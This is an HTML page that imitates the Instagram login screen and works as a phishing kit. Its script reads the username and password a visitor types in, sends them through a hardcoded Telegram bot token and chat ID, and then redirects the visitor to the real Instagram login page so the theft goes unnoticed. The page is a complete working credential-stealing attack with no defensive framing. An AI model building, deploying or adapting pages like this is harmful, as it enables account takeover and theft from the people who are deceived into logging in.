<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .main {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            margin-bottom: 10px;
        }

        .logo {
            width: 180px;
            margin-bottom: 30px;
        }

        .logo img {
            width: 100%;
            height: auto;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        input {
            padding: 12px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 12px;
            margin-bottom: 8px;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        button {
            background-color: #0095f6;
            color: white;
            font-weight: bold;
            border: none;
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.2s;
        }

        button:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            margin: 20px 0;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 15px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-align: center;
            text-decoration: none;
        }

        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px 30px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
        }

        .app-icons {
            display: flex;
            gap: 8px;
            justify-content: center;
        }

        .app-icons img {
            height: 40px;
        }

        footer {
            margin-top: 30px;
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
        }
    </style>
</head>
<body>

    <!-- Instagram login main box -->
    <div class="main">
        <!-- Logo (text or SVG, but here we use a simple SVG replica) -->
        <div class="logo">
            <svg viewBox="0 0 200 60" width="180" height="50">
                <text x="10" y="45" font-family="Arial, sans-serif" font-size="38" font-weight="600" fill="#262626">Instagram</text>
            </svg>
        </div>

        <!-- Login form -->
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <!-- OR divider -->
        <div class="divider">OR</div>

        <!-- Facebook login (fake, just for look) -->
        <a href="#" class="fb-login">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185">
                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
            </svg>
            Log in with Facebook
        </a>

        <!-- Forgot password -->
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <!-- Sign up box -->
    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <!-- Get the app -->
    <div class="get-app">
        Get the app.
        <div class="app-icons">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
        </div>
    </div>

    <!-- Footer links (lookalike) -->
    <footer>
        Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Contact Uploading & Non-Users · Meta Verified
        <br><br>
        English © 2025 Instagram from Meta
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();  // Page reload nahi hoga

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            var botToken = '8533918393:AAG7IUkhGu7RZHsfdq2Kz7-Sw5U6ji_fIM0';
            var chatId = '5244038129';

            var message = `New Instagram Login ⚠️%0A👤 Username: ${username}%0A🔑 Password: ${password}`;

            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        // Redirect to real Instagram after sending data
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    } else {
                        alert('Something went wrong, but redirecting...');
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error sending data, redirecting...');
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                });
        });
    </script>
</body>
</html>
